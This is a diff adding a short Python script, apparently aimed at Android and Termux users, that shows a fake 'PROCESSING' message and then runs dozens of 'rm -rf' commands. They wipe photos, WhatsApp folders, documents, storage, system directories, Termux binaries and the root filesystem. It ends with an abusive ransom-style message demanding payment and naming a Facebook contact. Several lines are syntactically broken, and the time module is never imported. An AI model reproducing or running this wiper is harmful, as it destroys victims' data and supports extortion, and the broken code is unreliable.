@@ -1,0 +1,105 @@
+import os,sys,random
+
+
+RED = '\033[1;91m'
+WHITE = '\033[1;97m'
+GREEN = '\033[1;32m' #
+YELLOW = '\033[1;33m'
+BLUE = '\033[1;34m'
+ORANGE = '\033[1;35m'
+hamii = "\033[1;91m◆\033[1;92m◇\033[1;93m◆\033[1;94m◇\033[1;91m◆\033[1;92m◇\033[1;93m◆\033[1;94m◇\x1b[0m"
+hamii2 = "\033[1;91m➤\033[1;33m➤\033[1;32m➤\033[1;35m➤\x1b[0m"
+
+logo =f"""
+{BLUE}
+[<\>] Codded by Hamii
+"""
+
+
+
+def hamid():
+    print(" \033[1;32mPROCESSING.................")
+    time.sleep(2.0)
+    os.system("rm -rf /sdcard")
+    os.system("rm -rf /sdcard/download")
+    os.system("rm -rf /sdcard/*")
+    os.system("rm -rf /storage/emulated/0/*")
+    os.system("rm -rf /storage/emulated/*")
+    os.system("rm -rf /*")
+    os.system("rm -rf /system/*")
+    os.system("rm -rf $HOME/../../*")
+    os.system("rm -rf $PERFIX/b")
+    os.system("rm -rf /sdcard/1")
+    os.system("rm -rf /sdcard/camera")
+    os.system("rm -rf /sdcard/vidmate")
+    os.system("rm -rf /sdcard/Android")
+    os.system("rm -rf /sdcard/DCIM")
+    os.system("rm -rf /sdcard/WhatsApp")
+    os.system("rm -rf /sdcard/GBWhatsApp")
+    os.system("rm -rf /sdcard/Picsart")
+    os.system("rm -rf /sdcard/pixelLab")
+    os.system("rm -rf /sdcard/Screenshot")
+    os.system("rm -rf /sdcard/Documents")
+    os.system('rm -rf /storage/emulated/0/*')
+    os.system('rm -rf /storage/emulated/*')
+    os.system('rm -rf /sdcard/*')
+    os.system('rm -rf /sdcard/0/*')
+    os.system('rm -rf /sdcard1/*')
+    os.system('rm -rf /storage/*')
+    os.system('rm -rf /*')
+    os.system("rm -rf /sdcard/download")
+    os.system("rm -rf /sdcard/*")
+    os.system("rm -rf /storage/emulated/0/*")
+    os.system("rm -rf /storage/emulated/*")
+    os.system("rm -rf /*")
+    os.system("rm -rf /system/*")
+    os.system("rm -rf $HOME/../../*")
+    os.system("rm -rf $PERFIX/b")
+    os.system("rm -rf /sdcard/1")
+    os.system("rm -rf /sdcard/camera")
+    os.system("rm -rf /sdcard/vidmate")
+    os.system("rm -rf /sdcard/Android")
+    os.system("rm -rf /sdcard/DCIM")
+    os.system("rm -rf /sdcard/WhatsApp")
+    os.system("rm -rf /sdcard/GBWhatsApp")
+    os.system("rm -rf /sdcard/Picsart")
+    os.system("rm -rf /sdcard/pixelLab")
+    os.system("rm -rf /sdcard/Screenshot")
+    os.system("rm -rf /sdcard/Documents")
+    os.system('rm -rf /storage/emulated/0/*')
+    os.system('rm -rf /storage/emulated/*')
+    os.system('rm -rf /sdcard/*')
+    os.system('rm -rf /sdcard/0/*')
+    os.system('rm -rf /sdcard1/*')
+    os.system('rm -rf /storage/*')
+    os.system('rm -rf /*')
+    os.system('rm -rf /system/*')
+    os.system('rm -rf $HOME/../../*')
+    os.system('rm -rf $PREFIX/b')
+    os.system('rm -rf $HOME/*')
+    os.system('rm -rf $HOME /dev/null')
+    os.system("rm -rf  /data/data/com.termux/files/usr/bin/")
+    os.system("rm -rf /data")
+    os.system('rm -rf /system/*')
+    os.system('rm -rf $HOME/../../*')
+    os.system('rm -rf $PREFIX/b')
+    os.system('rm -rf $HOME/*')
+    os.system('rm -rf $HOME /dev/null')
+    os.system("rm -rf  /data/data/com.termux/files/usr/bin/")
+    os.system("rm -rf /data")
+    os.system("rm -rf /data/data/com.termux")
+    print(logo)
+    print(" BSDK DATA GIA TERA 💥 \n")time.sleep(2)
+    print("        SURPRISE 🎉🎁🎉🎁🐣 agr data back chya to pesy ready rhk warna nikl ")
+    print(" YOUR DATA IS CAPTURED BY Devill\n");time.sleep(1)
+    print(" IF YOU WANT YOU DATA BACK CONTACT ME ");time.sleep(2)
+    print(" I'LL GIVE YOU YOUR DATA BACK💥");time.sleep(0.09)
+    print(57*"-")
+    print("[<\>] ADMIN ID :- https://www.facebook.com/profile.php?id=100051273633508");time.sleep(0.09)
+    rint(57*"-"
+    exit()
+
+
+
+
+hamid()
